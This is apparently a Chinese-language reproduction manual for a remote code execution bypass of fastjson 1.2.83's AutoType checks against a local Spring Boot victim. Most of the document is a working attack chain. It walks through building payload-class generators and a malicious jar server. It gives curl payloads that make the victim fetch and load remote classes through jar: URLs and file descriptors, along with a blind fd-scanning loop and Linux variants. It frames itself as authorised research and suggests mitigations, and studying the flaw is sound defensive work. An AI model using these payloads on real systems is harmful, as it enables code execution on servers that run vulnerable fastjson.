# fastjson 1.2.83 无 Gadget AutoType 绕过 RCE —— 手动复现手册

本地授权安全研究：复现 fastjson 1.2.83 在 **AutoType 关闭、SafeMode 关闭** 默认配置下的
`@JSONType` 探测类加载 RCE（公开已披露技术）。载荷为无害的弹计算器（macOS
`open -a Calculator`）。

> 四组 JDK × 中间件组合的利用全链路流程图（Mermaid）见 [EXPLOIT-FLOWS.md](EXPLOIT-FLOWS.md)。

## 漏洞原理（60 秒版）

`ParserConfig.checkAutoType`（ParserConfig.java:1479-1503）在 autoType 关闭时仍会用 ASM
探测 `@type` 指向的 class 字节是否带 `@JSONType` 注解：

1. `typeName.replace('.','/') + ".class"` → `getResourceAsStream()` 拉取字节（**SSRF 发生点**，
   走的是加载 fastjson 自己的 LaunchedURLClassLoader，其 `jar:file:...!/` 形式 URL 命中 JDK
   URLClassPath 的 base Loader，会跟随绝对 `jar:` URL）；
2. 若带 `@JSONType` → `jsonType=true` → `TypeUtils.loadClass(typeName)` 定义并初始化该类；
3. 类的 `<clinit>`（静态初始化块）在初始化时执行 → RCE。

`@type` 名以 `Exception`/`Error` 结尾时 checkAutoType 走 failure-soft 分支返回 null
（ParserConfig.java:1455-1457），@type 降级为普通 key、不报错 —— 这是 seed/盲扫能静默进行的原因。

两条利用 lane：

| Lane | 适用 | 请求数 | 关键点 |
|---|---|---|---|
| **A. FD 链** | 全 JDK（8~21+）、全中间件默认配置 | 2（seed + 命中），fd 未知时盲扫 | 类名 `jar:file:/dev/fd/N!...` 全单斜杠，过所有校验 |
| **B. 直连** | 仅 JDK 8，且链路无 `Class.forName`（Jetty 默认 / Tomcat 需一行配置） | 1 | 类名 `jar:http://...` 含 `://`，JDK 9+ defineClass 直接拒绝 |

`2130706433` 是 `127.0.0.1` 的十进制写法（点号会被 `replace('.','/')` 转成斜杠，不能用点分 IP）。

## 目录结构

```
pom.xml                     victim 工程（当前为 Lane A 状态：Boot 3.2.0 + Java 21）
src/main/java/com/example/victim/
  VictimApplication.java    SpringBoot 入口，启动后打印 fastjson/autoType/safeMode/CL 横幅
  ParseController.java      POST /parse，接收 JSON 字符串并 JSON.parse()
exploit/
  Gen.java                  Lane B 生成器：单个 POC class（@JSONType + <clinit> 载荷）
  GenFd.java                Lane A 生成器：seed 载体 + 每个候选 fd 一个定制 class，打包成一个 jar
  EvilServer.java           恶意 HTTP 服务器：对任意路径返回指定 jar，并记录每次抓取
```

仓库只提交源码和文档；`target/`、`out/`、`.class`、生成的 jar、下载的 ASM jar 及 IDE 状态均不提交。

## 环境要求

- macOS（本手册主路径；Linux 差异见「Linux 适配」）
- JDK 21（Lane A）与 JDK 8（Lane B），本机路径示例：
  - `/Library/Java/JavaVirtualMachines/jdk-21.jdk/Contents/Home`
  - `/Library/Java/JavaVirtualMachines/jdk-1.8.jdk/Contents/Home`
- Maven、curl、lsof

---

## Lane A：FD 链（默认状态，JDK 21 + Boot 3.2.0 + 内嵌 Tomcat，纯默认配置）

### A1. 构建并启动 victim（端口 8080）

```bash
cd <项目根目录>
JAVA_HOME=/Library/Java/JavaVirtualMachines/jdk-21.jdk/Contents/Home \
  mvn clean package -DskipTests

/Library/Java/JavaVirtualMachines/jdk-21.jdk/Contents/Home/bin/java \
  -jar target/fastjson-victim-1.0.0.jar --server.port=8080
# 预期横幅：
# [victim] fastjson=1.2.83 autoTypeSupport=false safeMode=false classLoader=org.springframework.boot.loader.LaunchedURLClassLoader
```

### A2. 编译利用工具（只需一次）

```bash
cd <项目根目录>
mvn dependency:copy -Dartifact=org.ow2.asm:asm:9.6 -DoutputDirectory=exploit

cd exploit
mkdir -p build
javac -cp asm-9.6.jar -d build Gen.java GenFd.java
javac -cp build -d build EvilServer.java
```

### A3. 生成 FD-lane 恶意 jar

```bash
# 参数：<fdBase> <起始fd> <结束fd> <输出jar> [命令]
# macOS 用 /dev/fd；fd 范围给宽一点（3..400）以便盲扫
java -cp build:asm-9.6.jar GenFd /dev/fd 3 400 fdprobe.jar "open -a Calculator"
# 预期：[genfd] wrote fdprobe.jar seed=foo/Exception fds=3..400 cmd=open -a Calculator
```

jar 内部结构：`foo/Exception.class`（无害 seed 载体，无注解无载荷）+
`fdN/Exception.class` × 398（内部名精确等于 `jar:file:/dev/fd/N!/fdN/Exception`，带
@JSONType，`<clinit>` 执行命令）。

### A4. 启动恶意服务器（端口 18080）

```bash
java -cp build EvilServer 18080 fdprobe.jar
# 预期：[evil] serving fdprobe.jar on :18080
```

### A5. 请求 1 —— seed（让 victim 把远程 jar 缓存到一个打开的 fd 后面）

```bash
curl -s -X POST http://127.0.0.1:8080/parse -H 'Content-Type: application/json' \
  -d '{"@type":"jar:http:..2130706433:18080.x!.foo.Exception","x":1}'
# 预期：{"ok":true,...}（@type 降级为普通 key）
# EvilServer 侧出现 2 次 GET /x —— SSRF 已完成
```

### A6. 找到缓存 jar 的 fd 号

```bash
VPID=$(pgrep -f "fastjson-victim-1.0.0.jar" | head -1)
lsof -p $VPID | grep jar_cache
# 输出示例：
# java  56622 switch  30r  REG  ... 241629 ... /T/jar_cache2780446139457084597.tmp
#                    ^^ fd 号 = 30（去掉后缀 r）
```

> macOS 上该临时文件**不会**被 unlink（与 Linux 不同），但能看见路径；fd 一样可用。

### A7. 请求 2 —— 命中（fd 号代入两处）

```bash
curl -s -X POST http://127.0.0.1:8080/parse -H 'Content-Type: application/json' \
  -d '{"@type":"jar:file:.dev.fd.30!.fd30.Exception","x":1}'
# 预期：
# {"ok":true,"resultType":"jar:file:.dev.fd.30!.fd30.Exception",...}   ← URL 形状的 @type 变成了真正的类
# victim 日志：=== fastjson FD-chain RCE: fd30 <clinit> executing in VICTIM ===
# 计算器弹出：pgrep -x Calculator
```

### A8.（可选）盲扫 —— 不知道 fd 号时，一个编号一个请求

```bash
pkill -x Calculator 2>/dev/null
for n in $(seq 3 60); do
  curl -s -X POST http://127.0.0.1:8080/parse -H 'Content-Type: application/json' \
    -d "{\"@type\":\"jar:file:.dev.fd.$n!.fd$n.Exception\",\"x\":1}" > /dev/null
  sleep 0.15
  if pgrep -x Calculator > /dev/null; then echo "SCAN RESULT: hit fd=$n"; break; fi
done
```

未命中的请求全部静默（Exception 后缀 failure-soft），victim 无任何报错。

---

## Lane B：JDK 8 直连（单请求）

### B1. 切换 victim 到 JDK 8 栈

`pom.xml` 两处改动：

```xml
<version>3.2.0</version>          →  <version>2.7.18</version>
<java.version>21</java.version>   →  <java.version>1.8</java.version>
```

**关键差异 —— 内嵌 Tomcat 默认配置打不通直连 lane**：Tomcat 请求线程的 TCCL 是
TomcatEmbeddedWebappClassLoader，其双亲委托用 `Class.forName(name,false,parent)` 实现，
JNI 校验拒绝连续斜杠（`jar:http://...` 点转斜杠后含 `//`）。二选一：

- **方案 1（推荐，对齐公开 PoC）**：在 `VictimApplication.main` 第一行加
  ```java
  ParserConfig.getGlobalInstance().setDefaultClassLoader(ParserConfig.class.getClassLoader());
  ```
  让 fastjson 跳过 TCCL，直接用 LaunchedURLClassLoader.loadClass（纯 Java 路径，无 JNI 校验）。
- **方案 2**：pom 里排除 `spring-boot-starter-tomcat`、改用 `spring-boot-starter-jetty`，
  内嵌 Jetty 默认不建独立 webapp CL，TCCL 本身就是 LaunchedURLClassLoader，零配置可打。

### B2. 构建并启动（JDK 8）

```bash
JAVA_HOME=/Library/Java/JavaVirtualMachines/jdk-1.8.jdk/Contents/Home \
  mvn clean package -DskipTests      # 必须 clean，清掉 JDK 21 的旧 class

/Library/Java/JavaVirtualMachines/jdk-1.8.jdk/Contents/Home/bin/java \
  -jar target/fastjson-victim-1.0.0.jar --server.port=8080
```

### B3. 生成直连 lane 的 jar 并启动恶意服务器

```bash
# 若尚未执行 A2，先下载 ASM 并编译 Gen/GenFd/EvilServer。
cd exploit
java -cp build:asm-9.6.jar Gen "jar:http://2130706433:18080/probe!/POC" build/POC.class "open -a Calculator"
jar cf probe -C build POC.class
java -cp build EvilServer 18080 probe
```

内部名必须精确等于 `jar:http://2130706433:18080/probe!/POC`（即 jar-URL 去掉 `.class`），
否则 defineClass 的名字一致性检查失败。

### B4. 单请求 RCE

```bash
curl -s -X POST http://127.0.0.1:8080/parse -H 'Content-Type: application/json' \
  -d '{"@type":"jar:http:..2130706433:18080.probe!.POC","x":1}'
# 预期：计算器弹出；victim 日志出现 @JSONType RCE banner；EvilServer 记录 GET /probe
```

若看到 `{"ok":false,"error":"JSONException: autoType is not support. jar:http:....."}`，
说明加载链撞上了 `Class.forName`（B1 的两个方案都没做）。

### B5. JDK 8 上同样可以打 Lane A

FD 链与 JDK 版本无关：按 B1/B2 起 JDK 8 victim（**不需要**方案 1 那行配置），然后照
Lane A 的 A3–A8 执行即可（已实测：fd 30 命中，TCCL=TomcatEmbeddedWebappClassLoader 也通）。

---

## Linux 适配

| 差异点 | macOS | Linux |
|---|---|---|
| fd 伪文件路径 | `/dev/fd/N` | `/proc/self/fd/N` |
| GenFd 参数 | `GenFd /dev/fd 3 400 ...` | `GenFd /proc/self/fd 3 400 ...` |
| 命中 payload | `jar:file:.dev.fd.N!.fdN.Exception` | `jar:file:.proc.self.fd.N!.fdN.Exception` |
| 缓存临时文件 | 不 unlink，`lsof -p PID \| grep jar_cache` 可见 | 打开后 unlink，用 `ls -l /proc/PID/fd` 找指向 `jar_cache*.tmp (deleted)` 的 fd |
| 弹计算器 | `open -a Calculator` | `gnome-calculator` / `xcalc`（或 `touch /tmp/PWNED`） |

## 结果判定清单

1. `curl` 响应 `resultType` 显示 URL 形状的类名（如 `jar:file:.dev.fd.30!.fd30.Exception`）—— 类已定义；
2. victim 日志打印 `=== fastjson ... <clinit> executing in VICTIM ===` —— 静态初始化块已执行；
3. `pgrep -x Calculator` 有输出 —— 命令已执行；
4. EvilServer 日志的 GET 记录 —— SSRF 证据。

## 原理速查（为什么有的组合通、有的不通）

- **fetch（SSRF）阶段**：用 `ParserConfig.class.getClassLoader()`（fat jar 即
  LaunchedURLClassLoader）。其 `jar:file:...!/` URL 命中 URLClassPath base Loader，跟随绝对
  `jar:` URL；普通 `java -cp` / IDE 启动的 AppClassLoader 全是 `file:` URL（FileLoader），
  会拦截该跳转 —— 所以 fat jar 是前提。
- **define 阶段**：走 TCCL（Tomcat 请求线程 = TomcatEmbeddedWebappClassLoader）。
  它委托父 CL 用 `Class.forName` → JNI `VerifyClassname` 拒绝连续斜杠 → JDK 8 直连 lane 死；
  FD lane 全单斜杠 → 过。JDK 9+ defineClass 额外拒绝含 `://` 的类名 → 直连 lane 为 JDK 8 限定。
- TCCL 由**执行线程**决定：Tomcat 请求线程 → TomcatEmbeddedWebappClassLoader；
  main/@Scheduled/@Async 等 → LaunchedURLClassLoader；内嵌 Jetty/Undertow 默认不建独立
  webapp CL → 请求线程也是 LaunchedURLClassLoader。

## 清理

```bash
pkill -f "fastjson-victim-1.0.0.jar"; pkill -f EvilServer; pkill -x Calculator
```

## 免责声明

本项目仅用于**本地授权环境**下的漏洞原理研究与防御验证，载荷为无害演示程序。
技术细节来自公开披露（PoC: github.com/wouijvziqy/Fastjson-JsonType-RCE-PoC）。
请勿对任何未授权目标使用。修复建议：升级 fastjson ≥ 1.2.83 以上的安全版本 / 迁移 fastjson2，
或开启 SafeMode（`ParserConfig.getGlobalInstance().setSafeMode(true)`）。
